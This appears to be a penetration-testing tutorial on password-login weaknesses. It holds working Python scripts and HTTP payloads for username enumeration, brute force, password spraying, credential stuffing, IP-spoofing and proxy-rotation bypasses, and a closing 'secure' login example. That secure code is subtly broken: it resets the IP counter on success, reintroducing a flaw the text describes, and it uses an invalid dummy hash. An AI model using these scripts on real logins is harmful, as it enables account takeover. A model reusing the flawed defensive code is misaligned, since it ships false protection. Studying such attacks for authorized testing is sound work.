# Vulnerabilities in password-based login

Password-based authentication is the most common authentication method but also one of the most vulnerable when poorly implemented. Attackers use brute-force attacks, username enumeration, and credential stuffing to compromise accounts. Even with protection mechanisms like rate limiting and account lockout, flawed logic often allows bypasses that enable automated attacks at scale.

Understanding these vulnerabilities is essential for both attackers (in authorized testing) and defenders building robust authentication systems.

> Only test systems you own or are explicitly authorized to assess.

## Brute-force attacks (fundamentals)

### What is brute-forcing?

Systematically testing username/password combinations until valid credentials are found. Can be:
- **Simple brute-force:** Try all possible combinations (computationally expensive)
- **Dictionary attack:** Try common passwords from wordlists
- **Credential stuffing:** Use leaked username:password pairs from breaches
- **Password spraying:** Try common password against many accounts (avoids lockout)

### Why brute-force works

**Weak passwords:**
- Users choose memorable passwords (Password1!, Summer2024!)
- Passwords follow predictable patterns (capital first letter, number at end, ! for special char)
- Password reuse across sites

**Predictable usernames:**
- Email format: firstname.lastname@company.com
- Common patterns: admin, administrator, root, user1, test
- Publicly disclosed in profiles, comments, error messages

**Inadequate protection:**
- No rate limiting
- Weak rate limiting (resets on success)
- Account lockout bypassed via password spraying
- No CAPTCHA after failed attempts

## Username enumeration (discovering valid accounts)

### Why username enumeration matters

Once you know valid usernames, you can:
1. Focus brute-force on known accounts (much faster)
2. Use targeted phishing
3. Check if high-value accounts exist (admin, root, ceo)
4. Build list for password spraying

### Method 1: Different error messages

**Vulnerable login:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = db.get_user(username)
    
    if not user:
        return "Invalid username", 401  # Different message
    
    if not verify_password(user, password):
        return "Invalid password", 401  # Different message
    
    return create_session(user)
```

**Exploitation:**
```http
POST /login HTTP/1.1

username=invalid_user&password=test
Response: "Invalid username"

POST /login HTTP/1.1

username=administrator&password=test
Response: "Invalid password"
```

Result: "administrator" account exists!

**Automated enumeration:**
```python
def enumerate_usernames(url, username_list):
    valid_usernames = []
    
    for username in username_list:
        response = requests.post(url, data={
            'username': username,
            'password': 'wrong_password_123'
        })
        
        if "Invalid password" in response.text:
            valid_usernames.append(username)
            print(f"[+] Valid: {username}")
        elif "Invalid username" in response.text:
            print(f"[-] Invalid: {username}")
    
    return valid_usernames
```

### Method 2: Subtle response differences

Even identical-looking messages can differ:

**Scenario 1 - Typo:**
```python
if not user:
    return "Invalid username or password"  # Note the period
if not verify_password(user, password):
    return "Invalid username or password "  # Extra space!
```

**Exploitation with Burp Intruder:**
1. Send login requests with different usernames
2. In Intruder, add column for response length
3. Sort by length - different lengths indicate different code paths
4. Use "Grep - Extract" to extract error message exactly
5. Compare byte-for-byte

**Scenario 2 - HTML differences:**
```html
<!-- Invalid username -->
<p class="error">Invalid username or password</p>

<!-- Invalid password -->
<p class="error ">Invalid username or password</p>  <!-- Extra space in class -->
```

### Method 3: Response timing differences

**Vulnerable code:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = db.get_user(username)
    
    if not user:
        return "Invalid credentials", 401  # Returns immediately
    
    # Password hashing takes time (bcrypt)
    if verify_password(user, password):  # ~100ms
        return create_session(user)
    
    return "Invalid credentials", 401
```

**Timing difference:**
- Invalid username: ~5ms response (immediate return)
- Valid username: ~105ms response (password hashing + verification)

**Exploitation:**
```python
import time
import statistics

def check_username_timing(url, username, iterations=20):
    timings = []
    
    for _ in range(iterations):
        start = time.time()
        requests.post(url, data={
            'username': username,
            'password': 'x' * 100  # Long password increases timing difference
        })
        elapsed = time.time() - start
        timings.append(elapsed)
    
    avg_time = statistics.mean(timings)
    return avg_time

# Test multiple usernames
for username in ['admin', 'test', 'user', 'administrator']:
    avg = check_username_timing('https://target.com/login', username)
    print(f"{username}: {avg:.4f}s")

# Output:
# admin: 0.0051s  (invalid - fast)
# test: 0.0049s   (invalid - fast)
# user: 0.0052s   (invalid - fast)
# administrator: 0.1042s  (valid - slow!)
```

**Enhanced exploitation (longer password to amplify timing):**
```python
# Use very long password to make bcrypt verification slower
long_password = 'a' * 100

timing_data = {}
for username in username_list:
    avg_time = check_username_timing(url, username, long_password)
    timing_data[username] = avg_time

# Find outliers (significantly slower = valid username)
avg_overall = statistics.mean(timing_data.values())
std_dev = statistics.stdev(timing_data.values())

for username, time in timing_data.items():
    if time > avg_overall + (2 * std_dev):  # 2 standard deviations
        print(f"[+] Valid username detected: {username}")
```

### Method 4: Status code differences

```python
# VULNERABLE: Different status codes
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = db.get_user(username)
    
    if not user:
        return "Invalid credentials", 404  # Not found
    
    if not verify_password(user, password):
        return "Invalid credentials", 401  # Unauthorized
    
    return redirect('/dashboard'), 302
```

**Exploitation:**
```python
for username in username_list:
    response = requests.post(url, data={'username': username, 'password': 'test'})
    
    if response.status_code == 401:
        print(f"[+] Valid: {username} (401 Unauthorized - wrong password)")
    elif response.status_code == 404:
        print(f"[-] Invalid: {username} (404 Not Found)")
```

### Method 5: Account lockout behavior

**Vulnerable pattern:**
```python
# After 3 failed attempts, account locks for 5 minutes
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    
    user = db.get_user(username)
    
    if not user:
        return "Invalid credentials", 401  # No lockout (user doesn't exist)
    
    if is_locked(user):
        return "Account locked. Try again later.", 403  # Different message!
    
    # Password verification logic...
```

**Exploitation (enumerate + identify locked accounts):**
```python
def enumerate_via_lockout(url, username):
    # Send 5 rapid requests with wrong password
    for _ in range(5):
        response = requests.post(url, data={
            'username': username,
            'password': 'wrong'
        })
    
    # Send one more
    response = requests.post(url, data={
        'username': username,
        'password': 'wrong'
    })
    
    if "Account locked" in response.text:
        return True  # Username exists
    else:
        return False  # Username doesn't exist (no account to lock)

# Test list
for username in username_list:
    exists = enumerate_via_lockout(url, username)
    if exists:
        print(f"[+] Valid: {username}")
```

## Bypassing brute-force protection

### Vulnerability 1: Counter resets on successful login

**Flawed protection:**
```python
failed_attempts = {}  # {ip: count}

@app.route('/login', methods=['POST'])
def login():
    ip = request.remote_addr
    username = request.form['username']
    password = request.form['password']
    
    # Check rate limit
    if failed_attempts.get(ip, 0) >= 3:
        return "Too many failed attempts", 429
    
    # Verify credentials
    if authenticate(username, password):
        failed_attempts[ip] = 0  # BUG: Counter resets!
        return create_session(username)
    else:
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
        return "Invalid credentials", 401
```

**Exploitation (intersperse valid logins):**
```python
# Attacker has own account: attacker:mypassword
# Target account: victim:???

passwords = load_wordlist('passwords.txt')

for i, password in enumerate(passwords):
    # Try victim password
    response = requests.post(url, data={
        'username': 'victim',
        'password': password
    })
    
    if "Welcome" in response.text:
        print(f"[+] Found password: {password}")
        break
    
    # Every 2 attempts, login with own account to reset counter
    if (i + 1) % 2 == 0:
        requests.post(url, data={
            'username': 'attacker',
            'password': 'mypassword'
        })
        # Counter reset - can continue attacking
```

**Burp Intruder payload (interleaved):**
```
victim:password1
attacker:mypassword
victim:password2
attacker:mypassword
victim:password3
attacker:mypassword
```

**Pitchfork attack configuration:**
```
Position 1 (username): victim, attacker, victim, attacker, victim...
Position 2 (password): password1, mypassword, password2, mypassword, password3...
```

### Vulnerability 2: Account lockout bypassed via password spraying

**Vulnerable protection:**
```python
# Locks account after 3 failed attempts
failed_logins = {}  # {username: count}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if failed_logins.get(username, 0) >= 3:
        return "Account locked", 403
    
    if not authenticate(username, password):
        failed_logins[username] = failed_logins.get(username, 0) + 1
        return "Invalid credentials", 401
    
    failed_logins[username] = 0
    return create_session(username)
```

**Problem:** Only tracks per-account, not global attempts.

**Exploitation (password spraying):**
```python
# Try ONE password against MANY accounts
# Each account only gets 1 attempt = no lockout triggered

usernames = ['admin', 'user1', 'user2', 'user3', ..., 'user1000']
common_passwords = ['Password1!', 'Summer2024!', 'Company123!']

for password in common_passwords:
    print(f"\n[*] Trying password: {password}")
    
    for username in usernames:
        response = requests.post(url, data={
            'username': username,
            'password': password
        })
        
        if "Welcome" in response.text:
            print(f"[+] SUCCESS: {username}:{password}")
            compromised_accounts.append((username, password))
    
    time.sleep(60)  # Wait between password attempts to avoid rate limiting
```

**Why this works:**
- Each account receives only 1-3 attempts (below lockout threshold)
- Even with 3-attempt limit, you can try 3 common passwords per account
- With 1000 users and 3 passwords, that's 3000 attempts without any lockout

### Vulnerability 3: IP-based blocking bypassed

**Vulnerable protection:**
```python
blocked_ips = set()

@app.route('/login', methods=['POST'])
def login():
    ip = request.remote_addr
    
    if ip in blocked_ips:
        return "IP blocked", 403
    
    # ... authentication logic
```

**Bypass 1: X-Forwarded-For header spoofing:**
```http
POST /login HTTP/1.1
Host: vulnerable.com
X-Forwarded-For: 1.2.3.4

username=victim&password=test1
```

Next request:
```http
X-Forwarded-For: 1.2.3.5

username=victim&password=test2
```

If server trusts `X-Forwarded-For` without validation, each request appears from different IP.

**Bypass 2: Proxy rotation:**
```python
import requests

proxies_list = load_proxy_list()  # Thousands of proxies

for password in password_list:
    proxy = random.choice(proxies_list)
    
    response = requests.post(url, 
        data={'username': 'victim', 'password': password},
        proxies={'http': proxy, 'https': proxy}
    )
    
    if "Welcome" in response.text:
        print(f"[+] Found: {password}")
        break
```

### Vulnerability 4: Multiple credentials per request

**Vulnerable JSON API:**
```python
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Rate limiting: 3 requests per minute per IP
    # ... rate limit check ...
    
    if authenticate(username, password):
        return jsonify({'success': True, 'token': generate_token(username)})
    
    return jsonify({'success': False}), 401
```

**Exploitation (send array instead of string):**
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "administrator",
  "password": ["password1", "password2", "password3", "password4", ..., "password1000"]
}
```

If server iterates through password array and checks each:
```python
# Vulnerable server-side processing
passwords = data.get('password')
if isinstance(passwords, list):
    for pwd in passwords:  # BUG: Checks all passwords in one request
        if authenticate(username, pwd):
            return success()
```

Result: 1 request tests 1000 passwords (bypasses rate limiting).

**Alternative JSON payload:**
```json
{
  "username": "administrator",
  "password": {
    "0": "password1",
    "1": "password2",
    "2": "password3",
    ...
    "999": "password1000"
  }
}
```

## HTTP Basic Authentication vulnerabilities

### How HTTP Basic Auth works:

Client sends credentials in every request:
```http
GET /admin HTTP/1.1
Host: example.com
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

`YWRtaW46cGFzc3dvcmQ=` is Base64 encoding of `admin:password`

**Decode:**
```python
import base64
auth_header = "Basic YWRtaW46cGFzc3dvcmQ="
encoded = auth_header.replace("Basic ", "")
decoded = base64.b64decode(encoded).decode()
print(decoded)  # admin:password
```

### Vulnerabilities:

#### 1) Credentials in every request (MitM vulnerability)

Without HTTPS:
```http
GET /api/data HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

Transmitted in cleartext over network → easily intercepted.

#### 2) No built-in brute-force protection

```http
GET /admin HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQx

GET /admin HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQy

GET /admin HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQz
```

Server typically checks each immediately without rate limiting.

**Brute-force automation:**
```python
import base64
import requests

def try_credentials(url, username, password):
    credentials = f"{username}:{password}".encode()
    encoded = base64.b64encode(credentials).decode()
    
    headers = {'Authorization': f'Basic {encoded}'}
    response = requests.get(url, headers=headers)
    
    return response.status_code

# Brute-force
for password in password_list:
    status = try_credentials('https://target.com/admin', 'admin', password)
    
    if status == 200:
        print(f"[+] Found: admin:{password}")
        break
    elif status == 401:
        print(f"[-] Failed: {password}")
```

#### 3) CSRF vulnerability

HTTP Basic Auth doesn't prevent CSRF because browser automatically sends credentials:
```html
<!-- Attacker's page -->
<img src="https://target.com/admin/delete-user?id=123">
```

If victim is logged in with HTTP Basic Auth, browser automatically includes Authorization header → CSRF succeeds.

#### 4) Credential reuse

Basic Auth often protects low-value endpoints:
```text
https://target.com/internal-docs (Basic Auth: docs:password123)
```

Same credentials might be reused for:
- Admin panel
- SSH access
- Database access
- API keys

## Practical exploitation workflows

### Workflow 1: Username enumeration → Targeted brute-force

**Step 1: Enumerate usernames**
```python
common_usernames = ['admin', 'administrator', 'root', 'test', 'user', 'backup']
valid_usernames = enumerate_usernames(url, common_usernames)
# Result: ['admin', 'backup']
```

**Step 2: Brute-force with targeted wordlist**
```python
for username in valid_usernames:
    for password in password_list:
        if try_login(username, password):
            print(f"[+] Compromised: {username}:{password}")
```

### Workflow 2: Password spraying

**Step 1: Build username list**
```python
# From employee LinkedIn, company website, etc.
usernames = ['john.doe', 'jane.smith', 'bob.johnson', ...]
```

**Step 2: Try most common passwords against all users**
```python
common_passwords = [
    'Password1!',
    'Company2024!',
    'Welcome123!',
    'Summer2024!'
]

for password in common_passwords:
    for username in usernames:
        if try_login(username, password):
            print(f"[+] {username}:{password}")
    time.sleep(300)  # 5 min between passwords
```

### Workflow 3: Credential stuffing

```python
# Use breached credentials from haveibeenpwned, dehashed, etc.
with open('breach_db.txt') as f:
    for line in f:
        username, password = line.strip().split(':')
        if try_login(username, password):
            print(f"[+] Password reuse: {username}:{password}")
```

## Prevention strategies

### Secure login implementation:

```python
from werkzeug.security import check_password_hash
import time
import secrets

# Track attempts per IP and per account
ip_attempts = {}  # {ip: {'count': N, 'locked_until': timestamp}}
account_attempts = {}  # {username: {'count': N, 'locked_until': timestamp}}

@app.route('/login', methods=['POST'])
def secure_login():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    
    # Check IP rate limit
    if is_ip_blocked(ip):
        log_security_event('blocked_ip_attempt', ip)
        return generic_error(), 429
    
    # Check account lockout
    if is_account_locked(username):
        log_security_event('locked_account_attempt', username, ip)
        return generic_error(), 429
    
    # Always perform password hash check (prevent timing attacks)
    user = db.get_user(username)
    
    if user:
        password_hash = user.password_hash
    else:
        # Use dummy hash for non-existent users
        password_hash = "$2b$12$dummy_hash_for_timing_consistency"
    
    # Always check password (even if user doesn't exist)
    password_valid = check_password_hash(password_hash, password)
    
    # Verify both user exists AND password correct
    if user and password_valid and user.is_active:
        # Success - reset counters
        reset_attempt_counters(username, ip)
        
        session_token = create_secure_session(user)
        log_security_event('successful_login', username, ip)
        
        return jsonify({'success': True, 'token': session_token})
    else:
        # Failure - increment counters
        increment_attempt_counters(username, ip)
        
        log_security_event('failed_login', username, ip)
        
        # SAME generic error regardless of reason
        return generic_error(), 401

def generic_error():
    # Identical error every time
    return jsonify({'error': 'Invalid username or password'}), 401

def is_ip_blocked(ip):
    if ip not in ip_attempts:
        return False
    
    data = ip_attempts[ip]
    
    # Check if still locked
    if data.get('locked_until', 0) > time.time():
        return True
    
    # Check attempt count
    if data.get('count', 0) >= 20:  # 20 attempts per 15 min
        return True
    
    return False

def is_account_locked(username):
    if username not in account_attempts:
        return False
    
    data = account_attempts[username]
    
    # Check if still locked
    if data.get('locked_until', 0) > time.time():
        return True
    
    return False

def increment_attempt_counters(username, ip):
    # Increment IP counter
    if ip not in ip_attempts:
        ip_attempts[ip] = {'count': 0, 'first_attempt': time.time()}
    
    ip_attempts[ip]['count'] += 1
    
    # Lock IP if threshold exceeded
    if ip_attempts[ip]['count'] >= 20:
        ip_attempts[ip]['locked_until'] = time.time() + 900  # 15 min
    
    # Increment account counter
    if username not in account_attempts:
        account_attempts[username] = {'count': 0}
    
    account_attempts[username]['count'] += 1
    
    # Lock account if threshold exceeded
    if account_attempts[username]['count'] >= 5:
        account_attempts[username]['locked_until'] = time.time() + 300  # 5 min
        
        # Alert user
        user = db.get_user(username)
        if user:
            send_alert_email(user.email, "Multiple failed login attempts")
```
